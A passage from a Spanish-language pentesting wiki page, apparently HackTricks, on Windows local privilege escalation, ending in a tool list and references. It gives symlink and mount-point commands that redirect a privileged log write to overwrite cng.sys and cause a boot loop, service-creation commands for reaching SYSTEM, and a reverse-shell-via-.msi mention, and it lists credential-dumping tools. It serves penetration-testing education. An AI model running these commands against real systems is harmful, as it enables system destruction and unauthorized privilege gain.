- No hay **fallback** ni **recuperación** sin intervención externa (por ejemplo, reparación del arranque o acceso al disco).

### De rutas de logs/backups privilegiadas + symlinks de OM a arbitrary file overwrite / boot DoS

Cuando un **servicio privilegiado** escribe logs/exports en una ruta obtenida de una **configuración modificable**, redirige esa ruta mediante **symlinks de Object Manager + puntos de montaje NTFS** para convertir la escritura privilegiada en un arbitrary overwrite (incluso **sin** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Requisitos**
- La configuración que almacena la ruta de destino debe poder ser modificada por el atacante (por ejemplo, `%ProgramData%\...\.ini`).
- Capacidad para crear un punto de montaje hacia `\RPC Control` y un symlink de archivo de OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Una operación privilegiada que escriba en esa ruta (log, export, informe).

**Cadena de ejemplo**
1. Lee la configuración para recuperar el destino del log privilegiado, por ejemplo, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirige la ruta sin privilegios de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente con privilegios escriba el registro (por ejemplo, que el administrador active «send test SMS»). La escritura ahora termina en `C:\Windows\System32\cng.sys`.
4. Inspecciona el objetivo sobrescrito (con un parser hex/PE) para confirmar la corrupción; reiniciar obliga a Windows a cargar la ruta del controlador manipulado → **DoS mediante bucle de arranque**. Esto también se aplica a cualquier archivo protegido que un servicio con privilegios abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys`, se puede intentar cargar primero, lo que lo convierte en un destino fiable para un DoS con datos corruptos.



## **De High Integrity a System**

### **Nuevo servicio**

Si ya estás ejecutando un proceso con High Integrity, el **camino hacia SYSTEM** puede ser fácil: basta con **crear y ejecutar un nuevo servicio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Al crear un binario de servicio, asegúrate de que sea un servicio válido o de que el binario realice las acciones necesarias rápidamente, ya que se eliminará en 20s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de alta integridad, podrías intentar **habilitar las entradas de registro AlwaysInstallElevated** e **instalar** un reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves de registro implicadas y sobre cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### De High + privilegio SeImpersonate a System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate a privilegios de Full Token

Si tienes esos privilegios del token (probablemente los encontrarás en un proceso que ya tenga alta integridad), podrás **abrir casi cualquier proceso** (excepto procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Al usar esta técnica, normalmente se **selecciona cualquier proceso que se ejecute como SYSTEM con todos los privilegios del token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios del token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica es utilizada por meterpreter para escalar privilegios en `getsystem`. La técnica consiste en **crear un pipe y después crear o abusar de un servicio para escribir en ese pipe**. Entonces, el **servidor** que creó el pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente del pipe (el servicio), obteniendo privilegios SYSTEM.\
Si quieres [**aprender más sobre name pipes, deberías leer esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de alta integridad a System usando name pipes, deberías leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **secuestrar una dll** que esté siendo **cargada** por un **proceso** que se ejecute como **SYSTEM**, podrás ejecutar código arbitrario con esos permisos. Por tanto, Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de conseguir desde un proceso de alta integridad**, ya que tendrá **permisos de escritura** en las carpetas utilizadas para cargar dlls.\
**Puedes** [**aprender más sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **De Administrator o Network Service a System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### De LOCAL SERVICE o NETWORK SERVICE a todos los privilegios

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Más ayuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Herramientas útiles

**La mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Comprueba si existen errores de configuración y archivos sensibles (**[**compruébalo aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Comprueba algunos posibles errores de configuración y recopila información (**[**compruébalo aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Comprueba si existen errores de configuración**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales de Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Realiza password spraying en el dominio con las contraseñas recopiladas**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta de spoofing y man-in-the-middle de ADIDNS/LLMNR/mDNS para PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de privesc en Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Busca vulnerabilidades conocidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(Necesita derechos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades conocidas de privesc (debe compilarse usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host en busca de errores de configuración (es más una herramienta de recopilación de información que de privesc) (debe compilarse) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompiled en GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Comprueba si existen errores de configuración (ejecutable precompiled en GitHub). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Comprueba posibles errores de configuración (exe procedente de Python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada basándose en este post (no necesita accesschk para funcionar correctamente, pero puede utilizarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Tienes que compilar el proyecto usando la versión correcta de .NET ([consulta esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión instalada de .NET en el host víctima, puedes ejecutar:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Fundamentos de la escalada de privilegios en Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevación de privilegios mediante la explotación de permisos débiles en carpetas](http://www.greyhathacker.net/?p=738)
- [3] [Escalada de privilegios en Windows: una cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop de escalada de privilegios local en Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Escalada de privilegios - Windows - Guía completa de OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Escalada de privilegios - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guía de escalada de privilegios en Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista de comprobación de escalada de privilegios en Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Escalada de privilegios en Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Métodos de escalada de privilegios en Windows para Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing mediante macro VBA de Word a través de SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 hasta SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de cadena de formato + BOF de pila → VirtualAlloc ROP (RCE) y robo de tokens del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Persiguiendo al Silver Fox: gato y ratón entre las sombras del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilidad de sistema de archivos privilegiado presente en un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Herramientas de pruebas de Symbolic Link – uso de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Un enlace al pasado. Abusando de Symbolic Links en Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port de Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: resolución peligrosa de módulos en Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Módulos de Node.js: carga desde carpetas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - desafíos de la checklist de C/C++, resueltos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - función RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: encadenando condiciones de carrera del kernel de CLDFLT y DirectX para LPE en Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un I/O Ring para gobernarlos a todos: un primitive completo de exploit de lectura/escritura en Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusando de eliminaciones arbitrarias de archivos para escalar privilegios y otros grandes trucos](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - código del exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataques contra WSUS, parte 2: CVE-2020-1013, un 1-Day de escalada de privilegios local en Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: explorando Credential Manager y Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC de CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: cuando un cambio de imagen conduce a una escalada de privilegios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - extracción de claves privadas SSH del agente SSH de Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
{{#include ../../banners/hacktricks-training.md}}
